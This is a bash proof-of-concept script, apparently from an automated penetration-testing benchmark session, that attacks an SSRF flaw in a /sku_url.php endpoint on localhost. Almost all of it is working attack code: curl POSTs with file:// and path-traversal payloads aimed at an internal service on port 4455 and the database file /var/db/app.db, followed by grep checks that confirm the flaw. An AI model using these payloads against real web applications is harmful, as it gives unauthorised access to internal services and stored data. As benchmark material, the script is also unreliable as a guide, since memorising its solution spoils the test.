#!/bin/bash
# POC: SSRF via sku_url.php with path traversal attempt to access /var/db/app.db
# Target: ./repo
# Created: 2025-12-01T15:55:38.486Z
# Session: benchmark-XBEN-092-24-minbdcli

# SSRF via sku_url.php - Path Traversal to Internal Database
# This POC attempts to exploit SSRF vulnerability in /sku_url.php endpoint
# to access internal database via path traversal through the skumodel service

TARGET="http://localhost:8081"
ENDPOINT="/sku_url.php"

echo "[*] Testing SSRF via sku_url.php endpoint"
echo "[*] Target: $TARGET$ENDPOINT"
echo ""

# Test 1: Confirm port filtering mechanism reveals internal hostname
echo "[*] Test 1: Port filtering bypass attempt - reveals internal hostname 'skumodel'"
echo "[*] Command: curl -X POST $TARGET$ENDPOINT -d 'url=file:///var/db'"
RESPONSE1=$(curl -s -X POST "$TARGET$ENDPOINT" -d "url=file:///var/db")
echo "[*] Response: $RESPONSE1"
echo ""

# Test 2: Path traversal to database file via internal service
echo "[*] Test 2: Path traversal attack - attempting to access /var/db/app.db via skumodel:4455"
echo "[*] Command: curl -X POST $TARGET$ENDPOINT -d 'url=http://127.0.0.1:4455/../../var/db/app.db'"
RESPONSE2=$(curl -s -X POST "$TARGET$ENDPOINT" -d "url=http://127.0.0.1:4455/../../var/db/app.db")
echo "[*] Response: $RESPONSE2"
echo ""

# Test 3: Direct access to internal service on port 4455
echo "[*] Test 3: Direct SSRF access to internal service"
echo "[*] Command: curl -X POST $TARGET$ENDPOINT -d 'url=http://127.0.0.1:4455/'"
RESPONSE3=$(curl -s -X POST "$TARGET$ENDPOINT" -d "url=http://127.0.0.1:4455/")
echo "[*] Response: $RESPONSE3"
echo ""

# Verify key indicators of SSRF vulnerability
echo "[*] Vulnerability Indicators:"
if echo "$RESPONSE1" | grep -q "port 4455"; then
    echo "[+] Port filtering mechanism confirmed - reveals 'port 4455' filtering"
fi

if echo "$RESPONSE2" | grep -q "skumodel"; then
    echo "[+] Internal hostname 'skumodel' exposed in error message"
fi

if echo "$RESPONSE2" | grep -q "Failed to open stream\|file_get_contents"; then
    echo "[+] file_get_contents() function confirmed as vulnerable function"
fi

if echo "$RESPONSE3" | grep -q "Failed to open stream\|Connection refused" || [ ! -z "$RESPONSE3" ]; then
    echo "[+] SSRF confirmed - attempted connection to internal service port 4455"
fi

echo ""
echo "[*] POC Demonstration Complete"
echo "[*] Vulnerability: Unvalidated URL input to file_get_contents() allows SSRF"
echo "[*] Impact: Access to internal services and potential path traversal to databases"